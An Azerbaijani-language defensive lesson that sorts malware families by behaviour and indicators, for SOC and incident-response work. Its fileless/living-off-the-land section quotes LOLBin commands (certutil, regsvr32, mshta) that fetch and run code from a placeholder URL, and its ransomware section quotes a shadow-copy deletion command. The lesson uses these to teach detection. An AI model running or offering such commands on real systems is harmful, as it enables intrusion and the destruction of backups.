# Zərərli proqram növləri və davranışı

"Malware" tək sözdür, amma içində bütöv bir zoopark gizlənir. Ransomware affiliate-i, banking trojan operatoru, kriptojaker, dövlət dəstəkli RAT komandası və adware-as-a-service işlədən yeniyetmə hamısı "zərərli proqram" yayır — amma onların məqsədləri, yayılma yolları, davamlılıq texnikaları və qoyduqları izlər tamamilə fərqlidir. Bir xəbərdarlığı növü təsnif etmədən "zərərli proqram infeksiyası" kimi triaj etmək, həkimin "xəstə xəstədir" yazıb evə getməsinə bənzəyir.

Bu dərs işlək bir təsnifatdır. Hər əsas ailə üçün **nə edir**, **necə yayılır**, **necə davam edir** və **telemetriyada necə görünür** mövzularını əhatə edirik. Məqsəd budur ki, EDR xəbərdarlığı və ya sandbox hesabatı masanıza gəldikdə, davranışı oxuyub, ailəni adlandırıb, saatlarla deyil, dəqiqələrlə doğru playbook-u tapa biləsiniz.

## Bu nə üçün vacibdir

Hər insident-cavab missiyası eyni cür başlayır: telefon zəng çalır, EDR xəbərdarlığı işə düşür, istifadəçi qəribə bir şey bildirir. Cavabverənin verməli olduğu ilk sual "bizə kim hücum etdi?" deyil, "**bu nə növ şeydir?**" Cavab sonrakı hər şeyi dəyişir — saxlama prioriteti, hansı logları əvvəlcə çıxarmaq, izolyasiya yoxsa karantin, danışıq mümkündürmü, hüquq komandasının növbəti 60 dəqiqədə nələri bilməsi lazımdır.

Ransomware infeksiyası dəqiqələr ərzində şəbəkə izolyasiyası tələb edir — hər əlavə dəqiqə daha çox şifrələnmiş fayl deməkdir. Banking trojan istifadəçinin hesabları üçün etibar-rotasiyası tələb edir. Kriptominer nadir hallarda təcili haldır, amma daha geniş giriş probleminin işarəsidir. RAT şəbəkədə hələ də olan uzunmüddətli düşməni göstərə bilər. Qurd lateral yayılmanı dayandırmaq üçün seqment səviyyəsində saxlama tələb edir. Məntiqi bomba *hələ* aktiv olmaya bilər və fitil yandırılıb-yandırılmadığı bilinmir. Təsnifat doğru playbook-un tetikleyicisidir.

Təsnifatı bilməyin ikinci səbəbi: zərərli proqram ailələri threat-intel ekosisteminin danışdığı dildir. CTI hesabatları, sandbox nəticələri, ATT&CK Software qeydləri və CISA xəbərdarlıqları hamısı ailə adlarından (LockBit, Emotet, RedLine, NjRAT, Conficker) istifadə edir. "RedLine gördük"-i "bu info-stealerdir, Telegram bota kredensial sızdırılması və brauzerdə saxlanmış sirlərə pivot gözləyin"-ə çevirə bilməyən SOC müdafiəçilərin malik olduğu yeganə ortaq dili israf edir.

Nəhayət, təsnifat dəyişir. Fileless hücumlar, living-off-the-land texnikaları, ransomware-as-a-service və AI-yardımlı polimorfizm tarixi kateqoriya sərhədlərini bulanıqlaşdırır. Müasir bir nüfuz tez-tez *zəncirlənmiş çoxlu ailə*-dir — loader infostealer atır, infostealer RAT-a ötürür, RAT nəhayət ransomware quraşdırır. Ailələri bilmək zənciri oxumağa imkan verir.

## Əsas anlayışlar

### Malware vs PUA

Antivirusun işarələdiyi hər şey cinayət mənasında zərərli proqram deyil. Tədarükçülər ayırırlar:

- **Malware** — zərər vermək üçün hazırlanmış proqram (faylları şifrələmək, kredensial oğurlamaq, arxa qapı açmaq). Aradan qaldırılması müzakirəsizdir.
- **PUA / PUP (Potentially Unwanted Application / Program)** — qıcıqlandırıcı və ya məxfiliyi pozan, lakin ciddi şəkildə zərərli olmayan proqramlar: pulsuz yükləmələrlə paketlənmiş brauzer alətlər çubuqları, yüzlərlə saxta xəta "tapan" registry təmizləyiciləri, telemetriya quraşdıran oyun launcher-ləri. Çox vaxt qanuni, çox vaxt EULA-da basdırılmış razılıqla yayılır.
- **Bloatware** — istifadəçinin tələb etmədiyi, OEM-lər tərəfindən əvvəlcədən quraşdırılmış proqram tətbiqləri.
- **Greyware** — PUA-lar, adware, spyware-lite alətlər və oxşar sərhəd halları üçün ümumi termin.

Sərhəd əməliyyat baxımından vacibdir. EDR növbəsindəki PUA siyasət səs-küyü kimi söndürülə bilər; eyni ciddilikdə həqiqi zərərli proqram aşkarlanması karantinə alınmalı və araşdırılmalıdır. Bir çox proqramlar ikisi üçün ayrı cavab SLA-ları saxlayır.

### Ransomware

Ransomware qurbanın fayllarını (və ya bütün diskləri) şifrələyir və açar üçün ödəniş tələb edir. Müasir variantlar adətən ən azı üç monetizasiya qatını zəncirləyir:

- **Şifrələmə** — faylların yerində simmetrik şifrələnməsi, açar isə hücumçunun nəzarətindəki asimmetrik açar altında möhürlənir. AES-256 + RSA-2048 kanonik nümunədir.
- **İkili haraclama** — şifrələmədən *əvvəl* məlumatları sızdırmaq, əgər qurbanın yedək nüsxələri olsa belə fidyə ödənilməzsə, ictimai ad-və-utandırma saytında ifşa etməklə hədələmək.
- **Üçlü haraclama** — əlavə olaraq qurbanı DDoS etmək, müştərilərini narahat etmək və ya təzyiq tətbiq etmək üçün tənzimləyiciləri xəbərdar etmək.

Diqqətə layiq ailələr: **LockBit** (RaaS, qanun-tətbiqi pozulmasına qədər 2022–2024-də çox aktiv), **Conti** (2022-də daxili sızıntılardan sonra çökdü; Black Basta kimi varislər törətdi), **REvil**, **BlackCat / ALPHV**, **Royal**, **Akira**, **Play**, **Clop** (təchizat zənciri kütləvi istismarına ixtisaslaşmışdır — MOVEit, GoAnywhere). İndikatorlar: fidyə-qeydi faylları (`README.txt`, `_HOW_TO_DECRYPT.html`), dəyişdirilmiş fayl uzantıları (`.lockbit`, `.conti`), kölgə-nüsxə silmə (`vssadmin delete shadows /all`), `wbadmin` saxtakarlığı, kütləvi fayl-adının dəyişdirilməsi SMB fəaliyyəti.

Müasir ransomware-in əksəriyyəti **Ransomware-as-a-Service (RaaS)** kimi göndərilir — tərtibatçı şifrələyici və sızıntı-saytı infrastrukturunu saxlayır; affiliate-lər hər uğurlu ödənişdən faiz ödəyirlər. Model o deməkdir ki, LockBit-in *texnikası* brendi yaşaya bilər və *brend* tərtibatçılar geri çəkildikdən sonra da davam edə bilər.

### Trojanlar və banking trojanlar

**Trojan** zərərli funksionallığı xeyirxah və ya gözlənilən birinin arxasında gizlədən proqramdır — eyni zamanda arxa qapı quraşdıran saxta hesab-faktura PDF-i, keylogger ilə sındırılmış oyun, loader atan "vergi forması" makros. Trojan yük növündən çox təhvil-vermə nümunəsidir; yükün özü adətən digər ailələrdən biridir.

**Banking trojanlar** brauzerlərə və ya OS-ə qoşulub onlayn bankçılıq, ödəniş və kripto-pul kisəsi saytları üçün kredensiallar və sessiya nişanları tutan ixtisaslaşmış alt sinifdir. Klassik nümunələr: **Zeus / ZeuS** (2007-, mənbə kodu sızdırıldı), **Emotet** (loader-as-a-service-ə çevrilmiş banking trojan), **TrickBot**, **QakBot**, **IcedID**, **Dridex**, **Ursnif**. Müasir bankerlər tez-tez web-injects-ə (səhifə DOM-unu canlı dəyişdirmək) və OAuth/MFA-token oğurluğuna keçirlər. Onlar `%APPDATA%`-da yaşayır, Run-açar davamlılığı qurur və fast-flux domenlərinə bekonlama edirlər.

### Remote-Access Trojanlar (RAT-lar)

RAT operatora kompromis olunmuş hostun interaktiv idarəsini verir: shell, fayl ötürmə, ekran çəkilişi, klaviş basışları, web kamera, mikrofon. RAT-lar script-kiddie alətlərindən tutmuş dövlət imrandantlarına qədər spektri əhatə edir.

İctimai/cinayətkar RAT-lar: **DarkComet**, **NjRAT** (MENA bölgəsində çox populyardır), **Quasar** (açıq mənbə, geniş şəkildə istifadə olunur), **AsyncRAT**, **Remcos**, **NetWire**, **Adwind / jRAT**. Hücumçular tərəfindən təkrar istifadə olunan kommersiya red-team alətləri: **Cobalt Strike Beacon**, **Sliver**, **Brute Ratel**. İndikatorlar: sabit C2-ə (tez-tez Dynamic DNS hostadı və ya pulsuz hosting provayderi) davamlı çıxış əlaqəsi, kodlanmış PowerShell, planlanmış tapşırıqlar, registry Run açarları, ailəyə xas mutekslər.

İncəlik: "cinayətkar RAT" və "red-team C2" arasındakı boşluq daralıb. Bir çox ransomware komandası RAT-ı kimi sındırılmış Cobalt Strike və ya açıq mənbə Sliver istifadə edir, bu o deməkdir ki, Cobalt Strike-ın standart Malleable-C2 profilini və JA3 izini aşkar edə bilən müdafiəçi həm də həqiqi nüfuzların böyük bir hissəsini aşkar edir. C2-çərçivə imzalarını stack-ınızda ən yüksək dəyərli aşkarlamalardan biri kimi qiymətləndirin.

### Qurdlar

Qurd özü-özünə yayılır — istifadəçi klikləməsi tələb olunmur — şəbəkə-əlçatan zəiflikdən və ya zəif kredensiallardan istifadə edərək. Bir host yoluxduqdan sonra qurd yeni hədəflər axtarır və onları yenidən yoluxdurur. Məşhur qurdlar: **Conficker** (2008-, MS08-067-i istismar etdi), **WannaCry** (2017, EternalBlue istismarı, kill-switch domeni), **NotPetya** (2017, ransomware kimi maskalandı, lakin wiper idi), **Stuxnet** (2010, ICS-i hədəfləyən), **SQL Slammer** (2003, 376 bayt, internetı 10 dəqiqəyə doydurdu).

Loglarınızda qurd fəaliyyəti birdən-birə yüzlərlə SMB/445, RDP/3389 və ya RPC əlaqəsini qısa pəncərədə daxili həmkarlara açan tək bir host kimi görünür. Şəbəkə seqmentləşdirilməsi, uzaq-kod-icra CVE-lərinin tez yamağı və SMB çıxış məhdudiyyətləri klassik müdafiələrdir.

Müasir "qurdlar" tez-tez ransomware-ə bulanır: NotPetya qurd kimi göründü, lakin sildi, BadRabbit SMB vasitəsilə yayıldı və ransomware atdı, EternalBlue-sinif istismarları yamaqlar mövcud olduqdan illər sonra hələ də hücum alət dəstlərində tapılır. Yamağlanmamış internet-əlçatan SMB/RPC xidmətini qurd maqniti və gözləyən tənzimləyici audit tapıntısı kimi qiymətləndirin.

### Casus proqram və info-stealer-lər

Casus proqram sakitcə müşahidə edir — klaviş basışları, klipboard, ekran şəkilləri, brauzer tarixi, kukilər, saxlanılmış kredensiallar. **Info-stealer-lər** müasir cinayət alt sinifidir: bir dəfə işləyən, hostdan monetizasiya oluna bilən hər şeyi qoparan, Telegram bota və ya HTTP atımına ekfiltrasiya edən və çıxan tək-atımlı ikili.

Aktiv ailələr: **RedLine** (brauzer parolları, kripto pul kisələri, FTP kredensialları, Discord, Steam), **Vidar**, **Lumma / LummaC2**, **Raccoon**, **StealC**, macOS üçün **Atomic Stealer (AMOS)**. Ekfiltrasiya olunan məlumat stealer-log marketlərində (Russian Market, qovulmadan əvvəl Genesis) bitir, burada ransomware affiliate-ləri ilkin giriş alır. İnfostealer-i tez tutmaq — məlumat marketə çatmadan əvvəl — partlayış radiusunu məhdudlaşdırır.

Praktiki olaraq, bir iş stansiyasında infostealer hiti karantin hadisəsi deyil, kredensial-rotasiya hadisəsidir. Zərərli proqram dəqiqələr içində yox olur; götürdüyü kredensiallar VPN-iniz, VDI-niz, SSO portalınız və istifadəçinin parol təkrar istifadə etdiyi hər istehlakçı xidmətinə qarşı sınaqdan keçiriləcək. Cavab artıq özünü silmiş ikili axtarmaqdan deyil, rotasiya, sessiya ləğvi və MFA yenidən qeydiyyatına məcbur etməyə yönəlməlidir.

### Bloatware

Bloatware OEM-lər (kompüter istehsalçıları, telefon tədarükçüləri) tərəfindən paketlənmiş, istifadəçinin tələb etmədiyi əvvəlcədən quraşdırılmış proqramdır: tədarükçü alətlər çubuqları, "PC sürətləndirmə" alətləri, ofis paketlərinin pulsuz sınaqları, telemetriya agentləri. Ciddi mənada zərərli deyil, lakin performansı pisləşdirir, hücum səthini genişləndirir (tədarükçü alətləri tarixən RCE-lərə malik olub — Lenovo Superfish, Dell SupportAssist) və əsas xətti çətinləşdirir.

`example.local` iş stansiyaları üçün ən yaxşı təcrübə: OEM təsvirini işlətmək əvəzinə qoşulma zamanı etibarlı Windows ISO-dan təzə təsvir yaratmaq; hansı OEM agentlərinin təsvir yaradılmasından sağ qaldığını izləyin və sənədləşdirin.

### Viruslar

Sıxı klassik mənada "virus" özünü host proqrama və ya fayla **bağlayan** və host işləyəndə işləyən zərərli koddur. Kateqoriyalar müasir zərərli proqramla çox üst-üstə düşür, lakin tarixi fərqlər tədarükçü adlandırılmasında hələ də görünür:

- **Fayl-yoluxducu viruslar** — icra edilə bilən faylları (Windows-da PE, Linux-da ELF) yamaqlayır ki, virus qanuni koddan əvvəl işləsin (`Sality`, `Virut`, `Ramnit`).
- **Boot-sektor virusları** — MBR/VBR-i üzərinə yazır; müasir UEFI sistemlərdə nadirdir, lakin kateqoriya MBR bootkit-lərində sağ qalır.
- **Makro viruslar** — Office sənədləri içindəki VBA (`Melissa` 1999, konseptual olaraq `ILOVEYOU` 2000). Bu gün də phishing-əlavələri ilə `.docm`, `.xlsm` vasitəsilə canlıdır.
- **Multi-partite** — yuxarıdakıların bir neçəsini birləşdirir.

Adi istifadədə "virus" tez-tez "zərərli proqram"-ın sinonimi kimi istifadə olunur; SOC biletində daha spesifik termini üstün tutun.

### Polimorf viruslar

Polimorf zərərli proqram **hər yoluxmada öz kodunu yenidən yazır** ki, hər nümunənin bayt sırası (və hash-i) fərqli olsun və imza əsaslı AV-ni məğlub etsin. Texnikalar: dəyişən deşifrələyici stub ilə şifrələnmiş gövdə, təlimat əvəzlənməsi (`mov eax, 0`-ı `xor eax, eax`-la əvəzləmək), kod yenidən sıralanması, lazımsız təlimat daxil etmə, registr yenidən adlandırılması.

Yaxın bir əmiuşağı, **metamorfik**, şifrələnmiş gövdəni paketləmək əvəzinə kodu özünü yenidən yazır. Müdafiələr: davranış aşkarlaması (zərərli proqram baytları dəyişsə də eyni *hərəkət edir*), sandbox-lar tərəfindən ümumi açma, diskdə deyil, açıldıqdan sonra yaddaşda YARA qaydaları.

Praktiki nəticə budur ki, **hash əsaslı bloklama yalnız dünənki tam build-i dayandırır**. Gündə minlərlə unikal nümunə yaradan polimorf ailə saatlar içində hash feed-lərini boğur. Miqyasa uyğunlaşan aşkarlama *paketdən çıxarılmış yaddaş təsviri* və ya *davranış imzası* üzərində işə düşəndir — hər ikisi disk hash-indən Pyramid of Pain-də daha yüksəkdə dayanır.

### Fileless və Living-off-the-Land (LotL)

Fileless zərərli proqram heç vaxt əsas yükünü diskə yazmır. İmrant yaddaşda yaşayır — tipik olaraq qanuni prosesə inyeksiya olunur — və davamlılıq registry açarları, WMI abunələri, kodlanmış skriptlər saxlayan planlanmış tapşırıqlar və ya logon-da bir-sətir yenidən işlətmək vasitəsilə əldə olunur.

Living-off-the-Land bunu daha da irəli aparır: hücumçu *yalnız daxili OS ikili faylları* (LOLBin-lər) istifadə edir. Nümunələr: `powershell.exe -enc <base64>`, `mshta.exe http://…`, `regsvr32.exe /s /u /i:http://… scrobj.dll` (Squiblydoo), `certutil -urlcache -f http://… payload.exe`, `wmic process call create`, `bitsadmin /transfer`, `msbuild.exe inline-task`. Diskdə yeni EXE olmaması o deməkdir ki, hash uyğunlaşması yoxdur və daha çətin aşkarlama problemi var. Müdafiələr: PowerShell Script Block Logging (Event ID 4104), AMSI inteqrasiyası, əmr-sətri auditi, Sysmon, LOLBin məhdudlaşdırılması üçün AppLocker / WDAC.

LOLBAS layihəsi yüzlərlə daxili Windows ikilisini və onların sui-istifadə hallarını kataloqlaşdırır; macOS GTFOBins-üslublu ekvivalent (`LOOBins`) macOS üçün eyni şeyi edir. Mühitlərində hansı LOLBin-lərin qanuni olaraq icra olunduğunu ən azı əsas xətt etməyən müdafiəçilərin onların zərərli istifadəsini görmək şansı yoxdur, çünki hər LOLBin Microsoft-imzalı ikili faylıdır və hər host-da hər gün xeyirxah səbəblərlə işləyir.

### Keyloggerlər

Keylogger-lər klaviş basışlarını (və tez-tez klipboard, siçan, ekran) qeyd edirlər. İki fiziki səviyyə:

- **Proqram keyloggerlər** — Windows klaviatura API-sinə qoşulurlar (`SetWindowsHookEx`), xam giriş istifadə edir və ya Linux-da `/dev/input`-dan birbaşa oxuyurlar. Yerləşdirməsi asan, AV-yə API qoşma nümunəsi ilə aşkar etməsi asandır.
- **Aparat keyloggerlər** — klaviatura ilə PC arasında USB pass-through dongle və ya klaviaturaya lehimlənmiş çip. OS-ə görünməz, yalnız fiziki yoxlama ilə məğlub edilir. Təhdid modeli: paylaşılan iş stansiyalarında insider hücumları, kioskalar.

MFA tutulmuş paroldan zərəri məhdudlaşdırır, lakin hücumçu qutudadırsa sessiya-cookie və ya nişan oğurluğunu qarşısını almır.

### Məntiqi bombalar

Məntiqi bomba daha böyük (tez-tez qanuni) proqrama yerləşdirilmiş zərərli koddur, yalnız şərt yerinə yetirildikdə aktivləşir — tarix, çatışmayan işçi qeydi, daxil olan xüsusi istifadəçi. İnsider-təhdid ssenarisi: qəzəbli tərtibatçı kataloqdan hesabı silindikdən 90 gün sonra məlumatı silən kod yerləşdirir.

Aşkarlama çətindir, çünki kod yatmışdır; müdafiələr təşkilatidir (kod baxışı, vəzifələrin ayrılması, istehsala yerləşdirmə üçün məcburi baxış, qeyri-adi fayl və ya mühit-dəyişən giriş nümunələri üçün monitorinq).

### Rootkit-lər

Rootkit hücumçunun mövcudluğunu gizlədir — fayllar, proseslər, şəbəkə əlaqələri, registry açarları hamısı OS API-larının qaytardığı baxışlardan filtrlənir. İmtiyaz dərinliyinə görə səviyyələr:

- **User-mode rootkit-lər** — DLL inyeksiyası, IAT/EAT qoşma, API yamağı. Yazması daha asan, EDR ilə aşkar etməsi daha asan.
- **Kernel-mode rootkit-lər** — SSDT, IDT və ya müasir `KeBugCheck` qoşma edən kernel sürücüləri; kernel obyektlərini birbaşa manipulyasiya edir (DKOM). Müasir Windows-da imzalanmış sürücülər tələb olunur; hücumçular Bring-Your-Own-Vulnerable-Driver (BYOVD)-dan istifadə edirlər.
- **Bootkit-lər / UEFI rootkit-lər** — OS-dən aşağıda, boot zəncirində və ya proşivkada oturur (`LoJax`, `MoonBounce`, `BlackLotus`). OS yenidən quraşdırılmasını sağ qalırlar; aradan qaldırılması üçün proşivka yenidən yazılması və ya aparatın əvəzlənməsi tələb olunur.

Aşkarlama tez-tez offline təsvir, yaddaş forensiyası və ya ixtisaslaşmış proşivka-bütövlüyü skanerləri (CHIPSEC, tədarükçü aləti) tələb edir.

Tam rootkit ovçuluğunun maliyyə-fayda nisbəti ümumi iş stansiyaları üçün nadir hallarda dəyər qatır; dərin proşivka yoxlamalarını yüksək dəyərli serverlər, rəhbər son nöqtələri və məlum hədəflənmiş mühitlər üçün saxlayın. Əksər filolar üçün "şübhə zamanı silib yenidən təsvir yaradırıq" "hər noutbuk-u aylıq forensiv təsvir edirik"-dən daha praktiki siyasətdir.

### Botlar və botnet-lər

**Bot** host-u uzaqdan idarə olunan node-a çevirən zərərli proqramdır. **Botnet** bir əmr altında bot sürüsüdür. İstifadə halları: kirayə-DDoS, spam, klik fırıldaqçılığı, kredensial doldurma, başqa cinayətkarlar üçün proksiləşdirmə, miqyasda kriptomayninq.

Diqqətə layiq: **Mirai** (2016, IoT botnet, DynDNS DDoS, mənbə kodu sızdırıldı və Mozi, Gafgyt və s.-ə sonsuz şəkildə fork edildi), **Emotet** (zərərli proqram çatdırılması üçün botnet-as-a-service), **Necurs**, **TrickBot**. Botnet C2 nümunələri: IRC (köhnə), sabit C2 siyahısına HTTP/HTTPS, P2P (Mozi, Hide-and-Seek), DGA (gündə minlərlə pseudo-təsadüfi domen istehsal edən domen-yaradan alqoritmlər, bunlardan yalnız bir neçəsi qeydiyyata alınır).

Son illərdə residensial-proksi varianti meydana çıxıb: cinayətkarlar kompromis olunmuş ev marşrutlaşdırıcıları və ağıllı qurğuları *başqa* trafik üçün çıxış node-ları kimi istifadəyə pul ödəyirlər — kredensial doldurma və hesab-ələ-keçirmə cəhdlərini normal istehlakçı ünvanları kimi görünən IP-lər vasitəsilə yumaq yolu. 2016-cı ildə DDoS-u gücləndirmiş eyni Mirai-sinif kompromisi indi 2026-da fırıldaqçılıq-as-a-service-i gücləndirir.

### Kriptominerlər və kriptojakinq

Kriptojakinq zərərli proqramı qurbanın CPU/GPU-sundan kriptovalyuta mayninqi üçün istifadə edir (Monero daimi sevimlidir — ASIC-müqavimətli, hovuz-mayninqli, məxfilik-yönlü). İki alt-tad:

- **Host kriptominerlər** — açıq Docker, Kubernetes, Redis və ya zəif veb tətbiqlər vasitəsilə serverlərə atılan `xmrig` və dostları. 24/7 100% CPU-da kilidlənmiş kimi görünür.
- **Brauzer kriptojakinqi** — kompromis olunmuş veb saytlara yerləşdirilmiş JavaScript mayningerləri (`Coinhive`-üslublu); 2019-da Coinhive bağlandığından bəri əsasən ölmüşdür, lakin variantlar hələ də görünür.

Aşkarlama düzdür (CPU doyumu, məlum mayninq hovuzlarına əlaqə), lakin kriptominerlər tez-tez daha dərin kompromisin işarəsidir — mayniner yerləşdirmək üçün istifadə olunan giriş eyni dərəcədə ransomware də yerləşdirə bilərdi.

### Adware və PUP-lar

Adware reklamlar inyeksiya edir: brauzer pop-up-ları, yönləndirmələr, dəyişdirilmiş axtarış-mühərriki standartları. Tez-tez pulsuz proqram yükləmələri ilə paketlənir. Adware, casus proqram və PUP-lar arasındakı sərhəd qeyri-müəyyən və tədarükçüyə xasdır. Əməliyyat baxımından yalnız adware başqa yükləri sideload etmirsə narahatlıq səviyyəsində qiymətləndirin (bir neçə adware ekosistemi bunu edir — adware ucuz monetizasiyadır və zərərli proqram çatdırılması ilə eyni affiliate şəbəkələrinə qayıdır).

### Loader-lər və dropper-lər

**Loader** (və ya **dropper**) yeganə işi daha böyük ikinci mərhələni gətirib icra etmək olan kiçik birinci-mərhələ yüküdür. Müasir nüfuzlar demək olar ki, həmişə loader-lə başlayır: o, ilkin sandbox-ları keçir (kiçik iz, açıq zərər yoxdur), host-u profilləşdirir (domen-qoşulmuş korporativ maşındır? sandbox VM-dir?), sonra həqiqi yükü çəkir.

Diqqətə layiq loader-lər: **SmokeLoader**, **GuLoader**, **BumbleBee**, **IcedID** (əvvəlcə banker, indi əsasən loader), **Hancitor**, **Latrodectus**. Loader mərhələsini tutmaq ən ucuz aşkarlamadır — ikinci mərhələ işlədikdən sonra daha çox şeyin düz getməsi tələb olunur.

Loader-lər tez-tez **DLL side-loading** vasitəsilə qanuni-imzalanmış ikili faylları sui-istifadə edirlər: loader DLL-i onu idxal edən adı dəyişdirilmiş imzalı EXE-nin yanına atın; OS məmnuniyyətlə zərərli DLL-i yükləyir, çünki EXE imzalanmışdır. Bu 2024–2026-ın ən populyar yayınma nümunələrindən biridir və sadə "imzasız kodu blokla" siyasətlərini keçir.

## Zərərli proqram təsnifat diaqramı

```mermaid
flowchart TB
    Mal[Zərərli proqram]
    Mal --> Money[Maliyyə]
    Mal --> Espionage[Casusluq / Müşahidə]
    Mal --> Disrupt[Pozulma / Sabotaj]
    Mal --> Resource[Resurs Oğurluğu]
    Mal --> Delivery[Çatdırılma / Möhkəmlənmə]
    Mal --> Nuisance[Narahatlıq / Greyware]

    Money --> Ransom[Ransomware]
    Money --> Banker[Banking trojan]
    Money --> Stealer[Info-stealer / casus]

    Espionage --> RAT[RAT]
    Espionage --> Keylog[Keylogger]
    Espionage --> Rootkit[Rootkit / bootkit]

    Disrupt --> Worm[Qurd]
    Disrupt --> Wiper[Wiper]
    Disrupt --> Logic[Məntiqi bomba]

    Resource --> Crypto[Kriptominer]
    Resource --> Bot[Bot / botnet node]

    Delivery --> Loader[Loader / dropper]
    Delivery --> Trojan[Trojan]
    Delivery --> Virus[Fayl-yoluxducu virus]

    Nuisance --> Adware[Adware]
    Nuisance --> PUP[PUP / PUA]
    Nuisance --> Bloat[Bloatware]
```

Qruplaşdırma **əsas məqsədə** görədir, lakin real nümunələr kateqoriyaları keçir: banker loader-ə çevrilə bilər, loader ransomware ata bilər, RAT boş girişi monetizasiya etmək üçün kriptominer yerləşdirə bilər. Diaqramı qəti bölgü deyil, başlanğıc təsnifatı kimi qiymətləndirin.

## Tipik infeksiyanın həyat dövrü

Bir an üçün ailələri kənara qoyaraq, tipik infeksiyanın *forması* yaddaşa salmağa dəyəcək qədər sabitdir:

1. **Çatdırılma** — phishing e-poçtu, drive-by yükləmə, təchizat zənciri kompromisi, açıq xidmət, USB. Zərərli proqram gəlir.
2. **İcra** — istifadəçi kliki, istismar, autorun. İlk təlimat qurbanın proses sahəsində işləyir.
3. **Müdafiə yayınması** — paketləmə, qarışıqlıq, sandbox yoxlamaları, AMSI yan keçmə, AV-məhsul siyahıya alınması. İmrant görünməməyə çalışır.
4. **Davamlılıq** — registry run açarları, planlanmış tapşırıqlar, xidmətlər, WMI abunələri, başlanğıc qovluğu. Yenidən başlatmadan sağ qalmaq.
5. **Kəşf** — `whoami`, `net group "Domain Admins"`, AD siyahıya alınması, şəbəkə xəritələnməsi. Mən haradayam və nəyə çata bilərəm?
6. **Lateral hərəkət** — RDP, SMB, WMI, PsExec, PowerShell remoting. Möhkəmlənmədən hədəfə tullanmaq.
7. **Toplama** — qutuda mərhələlənmiş məlumat; `%TEMP%` və ya `\Users\Public\`-də arxivlər.
8. **Ekfiltrasiya** — hücumçu nəzarətindəki bucket-ə HTTPS, DNS tunelləmə, sui-istifadə olunan bulud-saxlama tətbiqinə ötürmə.
9. **Təsir** — şifrələmə, wiper, ictimai haraclama, məlumat satışı, biznes məlumatlarının manipulyasiyası.

Hər indikator və hər ailəni bu həyat dövrünə xəritələndirmək ATT&CK-ın taktika sütunlarının kodlaşdırdığıdır. "Bu xəbərdarlıq hansı həyat dövrü mərhələsində işə düşdü?" sualını verən SOC ciddilik ballarına baxan SOC-dan daha tez doğru növbəti addıma çatır.

## Hər ailə üçün ümumi indikatorlar

| Ailə | Host artefaktları | Şəbəkə bekonları | Davamlılıq |
|---|---|---|---|
| Ransomware | `README*.txt`, dəyişdirilmiş uzantılar, kölgə-nüsxə silmə | TOR onion C2, sızıntı-saytı URL-ləri | Tez-tez efemerli (tək-atımlı) |
| Banking trojan | Brauzerlərə DLL inyeksiyası, web-inject konfiqurasiyaları | Fast-flux domenlər, C2-ə HTTPS | Run açarları, planlanmış tapşırıqlar |
| RAT | Mutekslər (ailə-spesifik), kodlanmış PS, ekran-çəkilişi buferi | DDNS host-a uzun-müddətli TCP/HTTPS | Run açarları, xidmətlər, WMI abunələri |
| Qurd | Bir host-dan kütləvi SMB/RPC/RDP zondları | Daxili skan trafiki; SMB istismar paketləri | Tez-tez yox — gizlilikdən üstün sürət |
| Info-stealer | Brauzer DB oxuma (`Login Data`, kukilər) | `/gate.php`-ə HTTP POST, Telegram API | Tək-atımlı, davamlılıq yox |
| Bloatware | `Program Files`-də OEM alət ikililəri | Tədarükçüyə telemetriya | Tədarükçü xidmətləri (qanuni) |
| Fayl-yoluxducu virus | Dəyişdirilmiş PE-lər, anomal seksiya ölçüləri | Tez-tez offline | Yoluxmuş fayllar yenidən icra olunur |
| Polimorf | Hər nümunə üçün fərqli hash, eyni davranış | Dəyişən | Valideyn ailə ilə eyni |
| Fileless / LotL | Yeni EXE yox; registry/WMI-də kodlanmış PS | LOLBin çıxış nümunələri | Registry, WMI, planlanmış tapşırıqlar |
| Keylogger | Hook DLL, `%APPDATA%`-də log faylı | Periodik e-poçt/HTTP eksfiltrasiyası | Run açarları |
| Məntiqi bomba | Qanuni tətbiqdə kod | Tez-tez yox | Host proqram daxilində |
| Rootkit | Gizli fayllar/proseslər; SSDT qoşmaları; imzasız sürücülər | Tez-tez sakit | Sürücü, proşivka, MBR |
| Bot | IRC/HTTP C2-ə əlaqə, DGA sorğuları | DGA, P2P, IRC | Run açarları, xidmətlər |
| Kriptominer | 100% CPU; `xmrig`-bənzər ikililər | Mayninq-hovuzu domenləri, Stratum protokolu | systemd, Run, xidmətlər |
| Adware | Brauzer-uzantı və ya proksi modifikasiyaları | Reklam-şəbəkəsi domenləri | Brauzer uzantıları, xidmətlər |
| Loader | Kiçik imzasız EXE/DLL; sandbox-yayınması yoxlamaları | İkinci mərhələni CDN-dən gətirir | Tez-tez yükünə ötürür |

Artefakt dəsti tier-2 analitikinin SIEM-in yanında saxladığı kopyalama vərəqəsidir. Hər sıra saatlarla insident-cavab təcrübəsini "X görsəniz, Y-ə şübhə edin"-ə yığır.

## Praktiki / məşqlər

1. **Nümunəni sandbox-da işlədin.** Xeyirxah EICAR-üslublu test və ya emal etməyə icazəniz olan MalwareBazaar-dan nümunə götürün, ANY.RUN-da və ya şəxsi Cuckoo / `example.local`-izolyasiyalı VM-də partladın. Proses ağacı, şəbəkə trafiki, atılmış fayllar və registry yazılarını qeyd edin. Yuxarıdakı təsnifatdan istifadə edərək nümunəni təsnif edin — "bu X-dir, çünki Y" əsaslandırılması ilə bir abzas yazın. Verdikinizi ictimai sandbox etiketi ilə müqayisə edin.
2. **PCAP ailə identifikasiyası.** Malware Traffic Analysis-dən Cobalt Strike beacon PCAP və Mirai IoT-skan PCAP yükləyin. Fayl adlarını oxumadan, hər birini trafik forması ilə müəyyən edin: müntəzəm interval bekonlama vs aqressiv port skanlanması. JA3 izlərini, ən yüksək təyinatları və DNS nümunələrini sənədləşdirin. Hər birini təsnifata xəritələndirin.
3. **Ransomware deşifrələyici axtarışı.** Saxta `example.local` ransomware qeydi (və ya No More Ransom-dan ictimai bir qeyd) götürün və No More Ransom deşifrələyici kataloqu və ID Ransomware-dən keçin: qeyd hansı ailədən gəlirdi? Pulsuz deşifrələyici mövcuddurmu? Onu müəyyən etmək üçün istifadə olunan indikatorları (fayl uzantısı, fidyə-qeydi adı, əlaqə e-poçtu/onion) sənədləşdirin.
